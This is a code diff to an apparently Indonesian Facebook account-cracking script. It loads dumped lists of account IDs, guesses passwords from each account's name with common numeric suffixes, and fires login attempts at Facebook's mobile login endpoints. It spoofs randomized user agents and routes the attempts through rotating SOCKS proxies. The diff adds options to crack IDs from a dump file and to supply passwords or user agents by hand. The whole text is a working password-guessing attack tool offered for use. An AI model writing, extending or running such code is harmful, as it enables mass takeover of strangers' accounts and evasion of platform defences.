@@ -50,6 +50,7 @@ except ImportError:
 pretty.install()
 proxxy=[]
 ugen,ugen2=[],[]
+ualu,ualuh=[],[]
 dump,id,akun=[],[],[]
 method,tokenku=[],[]
 pwpluss,pwnya=[],[]
@@ -70,82 +71,28 @@ for agenku in range(10000):
 	a='Mozilla/5.0 (Linux; Android '
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
-	d='SUPER-ID Build/KOT49H)'
+	d='SUPER-ID'
 	e=random.randrange(100, 9999)
 	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
 	j=random.randrange(1, 4)
-	k='Mobile Safari/537.36'
+	k='Mobile Safari/537.36 OPT/1.14.51'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen.append(uaku)
 	
-	a='Mozilla/5.0 (Windows NT'
-	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
-	c='WOW64)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['6.0.1','7.1.1','8.1.0'])
+	c='SUPER-ID Build/KOT49H)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
-	
-for agenku in range(10000):				
-	a='Mozilla/5.0 (Linux; Android '
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Infinix X5514D Build/KOT49H)'
-	e=random.randrange(100, 9999)
-	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen.append(uaku)
-	
-	a='Mozilla/5.0 (Windows NT'
-	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
-	c='WOW64)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Safari/537.36 Vivaldi/6.1.3035.111'
-	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
-	
-for agenku in range(10000):				
-	a='Mozilla/5.0 (X11; '
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Linux x86_64)'
-	e=random.randrange(100, 9999)
-	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Safari/537.36 Vivaldi/6.1.3035.111'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen.append(uaku)
-	
-	a='Mozilla/5.0 (Windows NT'
-	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
-	c='Win64; x64)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Safari/537.36 Vivaldi/6.1.3035.111'
-	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
+	i='Mobile Safari/537.36 OPT/1.7.21'
+	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	ugen.append(uakuh)
 
 for agenku in range(10000):
 	a='Mozilla/5.0 (Linux; Android '
@@ -161,19 +108,46 @@ for agenku in range(10000):
 	k='Mobile Safari/537.3'
 	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6.0.1','7.1.1','8.1.0'])
-	c='SUPER-ID Build/KOT49H)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+			
+	a='Mozilla/5.0 (Windows NT'
+	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
+	c='WOW64)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 OPT/1.7.21'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uakuh)
-	        
+	i='Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	ugen.append(uaku2)
+	
+for agenku in range(10000):				
+	a='Mozilla/5.0 (Linux: Android '
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='SUPER-ID'
+	e=random.randrange(100, 9999)
+	f='Applewebkit/537.36 (KHTML.like Gecko) Version/4.0 Chrome/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/537.36 OPT/1.14.51'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen.append(uaku)
+	
+	a='Mozilla/5.0 (Windows NT'
+	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
+	c='Win64; x64)'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=random.randrange(83,103)
+	f='0'
+	g=random.randrange(4200,4900)
+	h=random.randrange(40,150)
+	i='Safari/537.36 Vivaldi/6.1.3035.111'
+	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+	ugen.append(uaku2)
+			        
 for agenku in range(10):
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['6','7','8','9','10','11','12'])
@@ -395,6 +369,7 @@ def menu(my_name):
 	print(f'{K}└── [{P}+{K}]{P} RICODE : CYXIEON-XD')
 	kopi()
 	print(f'{K}└── [{P}01{K}]{P} Crack Publik ')
+	print(f'{K}└── [{P}02{K}]{P} Check File    ')
 	print(f'{K}└── [{P}02{K}]{P} Check Result    ')
 	print(f'{K}└── [{P}00{K}]{P} Hapus Kukis	')
 	kopi()
@@ -403,6 +378,8 @@ def menu(my_name):
 	if _Cyx_Xion_XD_ in ['1','01']:
 		crack_publik()
 	elif _Cyx_Xion_XD_ in ['2','02']:
+		crack_file()	
+	elif _Cyx_Xion_XD_ in ['3','03']:
 		cek_result()
 	elif _Cyx_Xion_XD_ in ['0','00']:
 		os.system('rm -rf .token.txt')
@@ -413,7 +390,7 @@ def menu(my_name):
 		print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Asu ')
 		back()
 
-#Crack Publick
+#------------------[ CRACK-PUBLIK ]----------------#
 def crack_publik():
 	try:
 		token = open('.token.txt','r').read()
@@ -459,10 +436,51 @@ def crack_publik():
 		print(f'{K}└── [{P}+{K}]{M} Pertemanan Tidak Public ')
 		time.sleep(3)
 		back()
-		
-#Result
+#-----------------[ CRACK FILE ]-----------------#
+def crack_file():
+	try:vin = os.listdir('/sdcard/DUMP-FILE/')
+	except FileNotFoundError:
+		print(f'{K}└── [{P}+{K}]{M} File Tidak Ditemukan ')
+		time.sleep(2)
+		back()
+	if len(vin)==0:
+		print(f'{K}└── [{P}+{K}]{M} Kamu Tidak Memiliki File Dump ')
+		time.sleep(2)
+		back()
+	else:
+		cih = 0
+		lol = {}
+		for isi in vin:
+			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
+			except:continue
+			cih+=1
+			if cih<100:
+				nom = ''+str(cih)
+				lol.update({str(cih):str(isi)})
+				lol.update({nom:str(isi)})
+				print(f'{K}└── [{P}0%s{K}] {P}%s ({K}[{H}%s{K}){P} idz'%(nom,isi,len(hem)))
+			else:
+				lol.update({str(cih):str(isi)})
+				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
+				print(f'{K}└── [{P}0%s{K}] {P}%s ({K}[{H}%s{K}){P} idz'%(nom,isi,len(hem)))
+		kopi()
+		hooh = input(f"{K}└── [{P}+{K}]{P} Pilih : ")
+		try:cuk = lol[hooh]
+		except KeyError:
+			print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontol ')
+			time.sleep(3)
+			back()
+		try:lin = open('/sdcard/DUMP-FILE/'+cuk,'r').read().splitlines()
+		except:
+			print(f'{K}└── [{P}+{K}]{M} File Tidak Ditemukan, Coba Lagi Nanti ')
+			time.sleep(2)
+			back()
+		for idz in lin:
+			id.append(idz)
+		setting()
+				
+#------------------[ CHECK-RESULT ]----------------#
 def cek_result():
-	kopi()
 	print(f'{K}└── [{P}01{K}]{P} Hasil OK ')
 	print(f'{K}└── [{P}02{K}]{P} Hasil CP')
 	kopi()
@@ -585,6 +603,24 @@ def setting():
 	else:
 		print(f'{K}└── [{P}+{K}]{M} Pilih Yang Bener Kontooll ')
 		back()
+#-------------[ MENU-PASSWORD ]---------------#
+	kopi()
+	print(f'{K}└── [{P}01{K}]{P} Password Slow ')
+	print(f'{K}└── [{P}02{K}]{P} Password Fast  ')
+	print(f'{K}└── [{P}03{K}]{P} Password Manual	')
+	kopi()
+	pwplus=input(f'{K}└── [{P}+{K}]{P} Pilih Sandi : ')
+	if pwplus in ['03','3']:
+		pwpluss.append('ya')
+		kopi()
+		print(f'{K}└── [{P}+{K}]{P} MASUKAN PASSWORD MINIMAL 6 KARAKTER{P}')
+		kopi()
+		pwku=input(f'{K}└── [{P}+{K}]{P} Masukan Sandi Manual : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
 		
 #-------------[ MENU-URL-LOGIN ]---------------#
 	kopi()
@@ -604,13 +640,24 @@ def setting():
 		method.append('asyinc')
 	else:
 		method.append('mobile')
-	passwrd()	
-		
-#Bagian Wordlist	
+	kopi()	
+	print(f'{K}└── [{P}+{K}]{P} GUNAKAN USER AGENT MANUAL ? Y/T {P}')
+	kopi()
+	uatambah = input(f'{K}└── [{P}+{K}]{P} Pilih : ')
+	if uatambah in ['y','Ya','ya','Y']:
+		ualuh.append('ya')
+		kopi()
+		Cyx = input(f'{K}└── [{P}+{K}]{P} Masukan User-Agent : ')
+		ualu.append(Cyx)
+	else:
+		ualuh.append('tidak')
+	passwrd()
+#------------------[ BAGIAN-WORDLIST ]----------------#	
 def passwrd():
 	global prog,des
 	kopi()
-	print(f'{K}└── [{P}+{K}]{P} MAINKAN MODE PESAWAT 300 IDZ{P}\n')
+	print(f'{K}└── [{P}+{K}]{P} MAINKAN MODE PESAWAT SETIAP 300 IDZ {P}')
+	print(f'{K}└─────────────────────────────────────────────{P}\n')
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -623,9 +670,17 @@ def passwrd():
 					if len(frs)<3:
 						pass
 					else:
+						pwv.append(nmf)
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'12')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -663,9 +718,11 @@ def metod1(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+#			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
@@ -714,6 +771,7 @@ def metod2(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -764,6 +822,7 @@ def metod3(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -814,6 +873,7 @@ def metod4(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
